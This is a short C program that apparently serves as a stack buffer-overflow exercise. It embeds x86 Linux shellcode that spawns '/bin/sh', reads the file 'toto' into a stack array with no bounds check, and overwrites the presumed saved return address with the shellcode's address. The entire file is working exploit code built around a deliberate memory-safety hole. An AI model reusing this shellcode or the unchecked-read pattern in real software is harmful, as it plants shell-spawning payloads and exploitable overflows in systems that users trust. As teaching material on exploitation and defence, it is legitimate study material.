#include<stdio.h>
FILE *fichier ;
void bar(){
  int foo=0, *pfoo = &foo ;

  char shellcode[] = "\xE8\x10\x00\x00" "\x00" "\x2F\x62\x69\x6E" 
                     "\x2F\x73\x68\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" 
                     "\x5B" "\x89\x5B\x08" "\xB8\x0B\x00\x00" "\x00" 
                     "\x8D\x4B\x08" "\x8D\x53\x0C" "\xCD\x80" 
                     "\xBB\x00\x00\x00" "\x00" "\xB8\x01\x00\x00"
                     "\x00" "\xCD\x80" ;
	
  
  while((shellcode[foo++]=fgetc(fichier))!=EOF) ;
  
  *(pfoo+8) = shellcode ;
}

int main(){ 
	
	fichier = fopen("toto","r") ;
	bar() ; 
	fclose(fichier) ;
	return 0 ;
}
